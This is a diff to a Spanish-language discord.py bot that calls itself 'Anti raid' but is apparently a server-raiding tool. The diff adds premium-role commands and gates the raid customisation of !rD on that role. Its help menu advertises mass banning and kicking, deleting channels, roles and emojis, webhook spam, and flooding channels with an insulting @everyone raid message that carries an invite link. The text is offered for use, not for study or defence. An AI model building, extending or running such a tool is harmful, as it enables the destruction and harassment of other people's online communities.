@@ -177,11 +177,71 @@ async def dar_premium(ctx, subcom_prem: str = None, miembro: discord.Member = No
     await ctx.send(f"✅ ¡{miembro.mention} ha sido autorizado! Ahora debe escribir `.premium` para reclamar su rol.")
 
 
+# ================= COMANDO !quitar premium =================
+@bot.command(name="quitar")
+async def quitar_premium(ctx, subcom_prem: str = None, miembro: discord.Member = None):
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.administrator: return
+
+    if not subcom_prem or subcom_prem.lower() != "premium" or not miembro:
+        await ctx.send("❌ Usa el comando así: `!quitar premium @Persona`")
+        return
+
+    if miembro.id in usuarios_autorizados:
+        usuarios_autorizados.remove(miembro.id)
+
+    rol = ctx.guild.get_role(ID_ROL_PREMIUM)
+    if rol and rol in miembro.roles:
+        try:
+            await miembro.remove_roles(rol, reason="Acceso Premium removido por un administrador.")
+            await ctx.send(f"🗑️ Se ha removido el rol Premium y la autorización a {miembro.mention} correctamente.")
+            return
+        except discord.Forbidden:
+            await ctx.send(f"⚠️ Se canceló su autorización interna, pero no pude quitarle el rol a {miembro.mention} por falta de permisos jerárquicos.")
+            return
+        except Exception as e:
+            logging.error(f"Error al quitar rol: {e}")
+
+    await ctx.send(f"🗑️ Se ha cancelado la autorización de {miembro.mention} (No poseía el rol activo actualmente).")
+
+
+# ================= 🔥 NUEVO COMANDO PREMIUM: !limpiar raid =================
+@bot.command(name="limpiar")
+async def limpiar_raid_config(ctx, subcom_raid: str = None):
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.administrator: return
+
+    if not subcom_raid or subcom_raid.lower() != "raid":
+        await ctx.send("❌ Uso correcto: `!limpiar raid` (Restablece los canales y spam por defecto).")
+        return
+
+    if ctx.guild.id in configuracion_premium:
+        del configuracion_premium[ctx.guild.id]
+        await ctx.send("♻️ Se han borrado las modificaciones personalizadas de este servidor. `!rD` volverá a usar los valores por defecto.")
+    else:
+        await ctx.send("ℹ️ Este servidor no tiene ninguna configuración personalizada activa actualmente.")
+
+
 # ================= COMANDO RECLAMAR .premium =================
 @bot.command(name="premium")
-async def reclamar_premium(ctx):
+async def reclamar_premium(ctx, subcom: str = None):
     if not ctx.guild: return
     
+    # 🔥 NUEVO SUBCOMANDO: .premium list (Muestra usuarios con el rol Premium)
+    if subcom and subcom.lower() == "list":
+        rol = ctx.guild.get_role(ID_ROL_PREMIUM)
+        if not rol:
+            await ctx.send("❌ El rol Premium no está configurado correctamente en el servidor.")
+            return
+        
+        miembros_premium = [m.mention for m in rol.members]
+        if miembros_premium:
+            lista_str = ", ".join(miembros_premium)
+            await ctx.send(f"👑 **Usuarios Premium en este servidor:**\n> {lista_str}")
+        else:
+            await ctx.send("ℹ️ No hay ningún usuario con el rol Premium actualmente en este servidor.")
+        return
+
     if not ctx.message.content.startswith(".premium"): 
         return
 
@@ -243,7 +303,7 @@ async def banpro(ctx):
         await asyncio.sleep(0.8)
 
 
-# ================= 2. COMANDO RAIDEAR Y SPAM (rD) SIN COOLDOWN =================
+# ================= 2. COMANDO RAIDEAR Y SPAM (!rD) CONDICIONADO A PREMIUM =================
 @bot.command()
 async def rD(ctx):
     global ejecuciones_por_servidor
@@ -261,14 +321,26 @@ async def rD(ctx):
 
     sumado = False
 
-    config_actual = configuracion_premium.get(
-        ctx.guild.id, 
-        {
+    es_premium = False
+    rol_premium = ctx.guild.get_role(ID_ROL_PREMIUM)
+    if rol_premium and rol_premium in ctx.author.roles:
+        es_premium = True
+
+    if es_premium:
+        config_actual = configuracion_premium.get(
+            ctx.guild.id, 
+            {
+                "canal": "Mc R", 
+                "media": GIF_DEFECTO,
+                "mensaje": "@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp"
+            }
+        )
+    else:
+        config_actual = {
             "canal": "Mc R", 
             "media": GIF_DEFECTO,
             "mensaje": "@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp"
         }
-    )
 
     try:
         ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
@@ -536,31 +608,50 @@ async def uptime(ctx):
         pass
 
 
-# ================= 12. MENÚ DE AYUDA COMPLETO =================
-@bot.command()
-async def ayuda(ctx):
-    menu = (
+# ================= 🔥 NUEVO: MENÚ DE AYUDA PREMIUM =================
+@bot.command(name="ayuda")
+async def ayuda(ctx, subcom: str = None):
+    # Si el usuario escribe !ayuda premium
+    if subcom and subcom.lower() == "premium":
+        menu_premium = (
+            "```\n"
+            "=== MacHUB Engine - Comandos Premium ===\n"
+            "!ayuda premium    -> Muestra este menú exclusivo de soporte premium.\n"
+            "!editar raid      -> Crea canales, spam e imágenes personalizadas paso a paso.\n"
+            "!config           -> Muestra el diseño premium configurado en el servidor.\n"
+            "!limpiar raid     -> Borra los ajustes de la raid y regresa a los de fábrica.\n"
+            ".premium list     -> Muestra la lista de usuarios con el rango Premium.\n"
+            "!dar premium @    -> Autoriza a un usuario para poder reclamar el rango.\n"
+            "!quitar premium @ -> Elimina los privilegios de un usuario de forma directa.\n"
+            ".premium          -> Comando de reclamo manual para el usuario autorizado.\n"
+            "
+```"
+        )
+        try: await ctx.send(menu_premium)
+        except: pass
+        return
+
+    # Menú de ayuda general tradicional
+    menu_general = (
         "```\n"
         "=== Mc R Anti raid - cmds ===\n"
-        "!uptime       -> Muestra el tiempo activo del bot y la latencia.\n"
-        "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
-        "!config       -> Muestra el diseño personalizado configurado.\n"
-        "!editar raid  -> Lanza el asistente interactivo para configurar la raid.\n"
-        "!dar premium  -> Otorga permiso a un usuario para reclamar el rango.\n"
-        ".premium      -> Canjea tu rol premium automáticamente si fuiste asignado.\n"
-        "!banpro       -> DM Masivo + Ban global utilizando la multimedia asignada.\n"
-        "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
-        "!rD           -> elimina todo, crea canales e inunda con la config actual.\n"
-        "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
-        "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
-        "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
-        "!rnServers    -> Cambia el nombre del servidor a 'Mc R'.\n"
-        "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
-        "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
-        "!emojisD      -> elimina los emojis y stickers personalizados.\n"
-        "```"
+        "!uptime          -> Muestra el tiempo activo del bot y la latencia.\n"
+        "!eje             -> Muestra el estado de ejecuciones del bot en vivo.\n"
+        "!ayuda premium   -> Despliega las herramientas avanzadas de personalización.\n"
+        "!banpro          -> DM Masivo + Ban global utilizando la multimedia asignada.\n"
+        "!kickpro         -> Expulsa de inmediato a todos los miembros.\n"
+        "!rD              -> elimina todo, crea canales e inunda con la config actual.\n"
+        "!ccpro           -> elimina canales y crea 50 categorías para colapsar UI.\n"
+        "!hookpro         -> Genera webhooks de spam ultra veloz por canal.\n"
+        "!nickpro         -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
+        "!rnServers       -> Cambia el nombre del servidor a 'Mc R'.\n"
+        "!rolesD          -> Destruye todos los roles existentes del servidor.\n"
+        "!rolesC          -> Genera 50 roles con colores arcoíris aleatorios.\n"
+        "!emojisD         -> elimina los emojis y stickers personalizados.\n"
+        "
+```"
     )
-    try: await ctx.send(menu)
+    try: await ctx.send(menu_general)
     except: pass
 
 
